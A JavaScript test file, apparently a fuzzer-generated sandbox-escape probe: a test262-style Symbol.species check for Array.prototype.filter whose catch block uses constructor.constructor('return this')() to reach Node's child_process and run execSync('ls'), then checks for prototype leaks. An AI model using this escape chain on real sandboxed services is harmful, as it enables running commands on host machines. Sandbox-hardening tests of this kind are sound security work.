try {
    var thisValue, args, result;
    var callCount = 0;
    var instance = [];
    var Ctor = function () {
        callCount += 1;
        thisValue = this;
        args = arguments;
        return instance;
    };
    var a = [
        1,
        2,
        3,
        4,
        5,
        6,
        7
    ];
    a.constructor = {};
    a.constructor[Symbol.species] = Ctor;
    result = a.filter(function () {
    });
    assert.sameValue(callCount, 1, 'Constructor invoked exactly once');
    assert.sameValue(Object.getPrototypeOf(thisValue), Ctor.prototype);
    assert.sameValue(args.length, 1, 'Constructor invoked with a single argument');
    assert.sameValue(args[0], 0);
    assert.sameValue(result, instance);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}